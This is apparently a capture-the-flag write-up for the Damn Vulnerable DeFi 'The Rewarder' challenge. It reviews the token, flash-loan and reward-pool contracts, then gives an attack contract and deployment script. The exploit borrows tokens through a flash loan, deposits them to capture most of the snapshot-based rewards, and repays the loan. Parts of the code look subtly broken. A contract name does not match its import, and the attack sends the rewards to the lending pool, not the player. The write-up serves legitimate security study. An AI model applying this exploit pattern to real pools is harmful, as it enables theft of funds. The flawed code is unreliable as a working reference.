<img src="https://github.com/wasny0ps/Damn-Vulnerable-DeFi/blob/main/src/5.png">

# Target Contract Review

Given contracts.

**AccountingToken.sol**
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "solady/src/auth/OwnableRoles.sol";

/**
 * @title AccountingToken
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @notice A limited pseudo-ERC20 token to keep track of deposits and withdrawals
 *         with snapshotting capabilities.
 */
contract Accounting is ERC20Snapshot, OwnableRoles {
    uint256 public constant MINTER_ROLE = _ROLE_0;
    uint256 public constant SNAPSHOT_ROLE = _ROLE_1;
    uint256 public constant BURNER_ROLE = _ROLE_2;

    error NotImplemented();

    constructor() ERC20("rToken", "rTKN") {
        _initializeOwner(msg.sender);
        _grantRoles(msg.sender, MINTER_ROLE | SNAPSHOT_ROLE | BURNER_ROLE);
    }

    function mint(address to, uint256 amount) external onlyRoles(MINTER_ROLE) {
        _mint(to, amount);
    }

    function burn(address from, uint256 amount) external onlyRoles(BURNER_ROLE) {
        _burn(from, amount);
    }

    function snapshot() external onlyRoles(SNAPSHOT_ROLE) returns (uint256) {
        return _snapshot();
    }

    function _transfer(address, address, uint256) internal pure override {
        revert NotImplemented();
    }

    function _approve(address, address, uint256) internal pure override {
        revert NotImplemented();
    }
}
```

AccountingToken is a limited pseudo-ERC20 token contract that is designed to keep track of deposits and withdrawals. It also has snapshotting capabilities, allowing for the creation of snapshots of token balances at specific points in time.

The contract defines three roles:

- `MINTER_ROLE` : This role is responsible for minting new tokens. Only addresses with this role can call the mint function, which creates new tokens and assigns them to a specified address.
- `SNAPSHOT_ROLE` :  This role is responsible for creating snapshots of token balances. Only addresses with this role can call the snapshot function, which creates a snapshot and returns a snapshot id.
- `BURNER_ROLE` : This role is responsible for burning tokens. Only addresses with this role can call the burn function, which destroys a specified amount of tokens from a specified address.

`mint()` : This function can be called by addresses with the **MINTER_ROLE** to create new tokens and assign them to a specified address.

`burn()` : This function can be called by addresses with the **BURNER_ROLE** to destroy a specified amount of tokens from a specified address.

`snapshot()` : This function can be called by addresses with the **SNAPSHOT_ROLE** to create a snapshot of token balances at the current block timestamp. It returns the snapshot id.

The `_transfer()` and `_approve()` functions are internal functions that are overridden from the ERC20 contract. In this contract, they are set to revert with a "NotImplemented" error, indicating that token transfers and approvals are not implemented in this contract.



**FlashLoanerPool.sol**
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 * @dev A simple pool to get flashloans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {
    using Address for address;

    DamnValuableToken public immutable liquidityToken;

    error NotEnoughTokenBalance();
    error CallerIsNotContract();
    error FlashLoanNotPaidBack();

    constructor(address liquidityTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));

        if (amount > balanceBefore) {
            revert NotEnoughTokenBalance();
        }

        if (!msg.sender.isContract()) {
            revert CallerIsNotContract();
        }

        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(abi.encodeWithSignature("receiveFlashLoan(uint256)", amount));

        if (liquidityToken.balanceOf(address(this)) < balanceBefore) {
            revert FlashLoanNotPaidBack();
        }
    }
}
```

The FlashLoanerPool contract is a simple pool that allows users to get flash loans of the DamnValuableToken (DVT) token.

The contract constructor takes the address of the DamnValuableToken contract as a parameter and initializes the "liquidityToken" variable with an instance of the DamnValuableToken contract.

`flashLoan()` : It allows users to request a flash loan of a specified amount of DVT tokens. 



**RewardToken.sol**
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "solady/src/auth/OwnableRoles.sol";

/**
 * @title RewardToken
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract RewardToken is ERC20, OwnableRoles {
    uint256 public constant MINTER_ROLE = _ROLE_0;

    constructor() ERC20("Reward Token", "RWT") {
        _initializeOwner(msg.sender);
        _grantRoles(msg.sender, MINTER_ROLE);
    }

    function mint(address to, uint256 amount) external onlyRoles(MINTER_ROLE) {
        _mint(to, amount);
    }
}
```
Basically, this contract provides a basic implementation of an ERC20 token with role-based access control for minting new tokens.

In the constructor, contract initializes the token with the name "Reward Token" and the symbol "RWT". It also initializes the contract owner and grants the owner the **MINTER_ROLE**.

`mint()` : This function is a public function that can be called by addresses with the **MINTER_ROLE**. It allows the minter to create new tokens and assign them to a specified address.


**TheRewarderPool.sol**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/utils/FixedPointMathLib.sol";
import "solady/src/utils/SafeTransferLib.sol";
import { RewardToken } from "./RewardToken.sol";
import { AccountingToken } from "./AccountingToken.sol";

/**
 * @title TheRewarderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract TheRewarderPool {
    using FixedPointMathLib for uint256;

    // Minimum duration of each round of rewards in seconds
    uint256 private constant REWARDS_ROUND_MIN_DURATION = 5 days;
    
    uint256 public constant REWARDS = 100 ether;

    // Token deposited into the pool by users
    address public immutable liquidityToken;

    // Token used for internal accounting and snapshots
    // Pegged 1:1 with the liquidity token
    AccountingToken public immutable accountingToken;

    // Token in which rewards are issued
    RewardToken public immutable rewardToken;

    uint128 public lastSnapshotIdForRewards;
    uint64 public lastRecordedSnapshotTimestamp;
    uint64 public roundNumber; // Track number of rounds
    mapping(address => uint64) public lastRewardTimestamps;

    error InvalidDepositAmount();

    constructor(address _token) {
        // Assuming all tokens have 18 decimals
        liquidityToken = _token;
        accountingToken = new AccountingToken();
        rewardToken = new RewardToken();

        _recordSnapshot();
    }

    /**
     * @notice Deposit `amount` liquidity tokens into the pool, minting accounting tokens in exchange.
     *         Also distributes rewards if available.
     * @param amount amount of tokens to be deposited
     */
    function deposit(uint256 amount) external {
        if (amount == 0) {
            revert InvalidDepositAmount();
        }

        accountingToken.mint(msg.sender, amount);
        distributeRewards();

        SafeTransferLib.safeTransferFrom(
            liquidityToken,
            msg.sender,
            address(this),
            amount
        );
    }

    function withdraw(uint256 amount) external {
        accountingToken.burn(msg.sender, amount);
        SafeTransferLib.safeTransfer(liquidityToken, msg.sender, amount);
    }

    function distributeRewards() public returns (uint256 rewards) {
        if (isNewRewardsRound()) {
            _recordSnapshot();
        }

        uint256 totalDeposits = accountingToken.totalSupplyAt(lastSnapshotIdForRewards);
        uint256 amountDeposited = accountingToken.balanceOfAt(msg.sender, lastSnapshotIdForRewards);

        if (amountDeposited > 0 && totalDeposits > 0) {
            rewards = amountDeposited.mulDiv(REWARDS, totalDeposits);
            if (rewards > 0 && !_hasRetrievedReward(msg.sender)) {
                rewardToken.mint(msg.sender, rewards);
                lastRewardTimestamps[msg.sender] = uint64(block.timestamp);
            }
        }
    }

    function _recordSnapshot() private {
        lastSnapshotIdForRewards = uint128(accountingToken.snapshot());
        lastRecordedSnapshotTimestamp = uint64(block.timestamp);
        unchecked {
            ++roundNumber;
        }
    }

    function _hasRetrievedReward(address account) private view returns (bool) {
        return (
            lastRewardTimestamps[account] >= lastRecordedSnapshotTimestamp
                && lastRewardTimestamps[account] <= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION
        );
    }

    function isNewRewardsRound() public view returns (bool) {
        return block.timestamp >= lastRecordedSnapshotTimestamp + REWARDS_ROUND_MIN_DURATION;
    }
}
```

This contract is called `TheRewarderPool` and it is used to distribute rewards to users who deposit liquidity tokens into the pool. The contract uses three different tokens: **the liquidity token**, **the accounting token**, and **the reward token**.


The liquidity token represents the tokens deposited by users into the pool. The accounting token is used for internal accounting and snapshots, and it is pegged 1:1 with the liquidity token. 

The contract has a constant variable called `REWARDS`, which represents the amount of rewards available for distribution.

`deposit()` : This function allows users to deposit liquidity tokens into the pool. It mints accounting tokens in exchange and distributes rewards if available.

`withdraw()` : This function allows users to withdraw their deposited liquidity tokens from the pool.

`distributeRewards()` : This function calculates and distributes rewards to users based on their deposited amount and the total deposits in the pool.

`_recordSnapshot()` : This function records a snapshot of the current state of the accounting token and updates the round number.

`_hasRetrievedReward()` : This function checks if a user has already retrieved their reward for the current rewards round.

`isNewRewardsRound()`: This function checks if a new round of rewards should be started based on the duration of the previous round.




Challenge's message:

> There’s a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.
Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!
You don’t have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.
By the way, rumours say a new pool has just launched. Isn’t it offering flash loans of DVT tokens?

# Subverting

```solidity
pragma solidity ^0.8.0;

interface IDVT{
    function transfer(address _recipient, uint256 _amount)external returns (bool);
    function approve(address _spender, uint256 _amount) external returns (bool);
}

interface IRewarderPool{
    function deposit(uint256 _amount) external;
    function withdraw(uint256 _amount) external;
}

interface IRewardToken{
    function transfer(address _recipient, uint256 _amount)external returns (bool);
    function balanceOf(address _user) external view returns (uint256);
}

interface IFlashLoanerPool{
    function flashLoan(uint256 amount) external;
}
contract AttackTheRewarder{

    IRewarderPool rewarderPool;
    IRewardToken rewardToken;
    IFlashLoanerPool flashPool;
    IDVT DVTtoken;

    constructor(address _rewarderPool, address _rewardToken, address _flashPool, address _DVTtoken){
        rewarderPool = IRewarderPool(_rewarderPool);
        rewardToken = IRewardToken(_rewardToken);
        flashPool = IFlashLoanerPool(_flashPool);
        DVTtoken = IDVT(_DVTtoken);
    }

    function attack(uint _amount) external{
        flashPool.flashLoan(_amount);
    }

    function receiveFlashLoan(uint256 _amount)  external payable{
        DVTtoken.approve(address(rewarderPool), _amount);
        rewarderPool.deposit(_amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
        rewarderPool.withdraw(_amount);
        DVTtoken.transfer(address(flashPool), _amount);
    }

}
```

```js
const AttackFactory = await ethers.getContractFactory('AttackTheRewarder', deployer);
attack = await AttackFactory.deploy(rewarderPool.address,rewardToken.address,flashLoanPool.address,liquidityToken.address);
await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
await attack.connect(player).attack(TOKENS_IN_LENDER_POOL);
```

![image](https://github.com/wasny0ps/Damn-Vulnerable-DeFi/assets/87646106/fb8a0bfb-71fe-4d84-847b-8d4e060aed43)

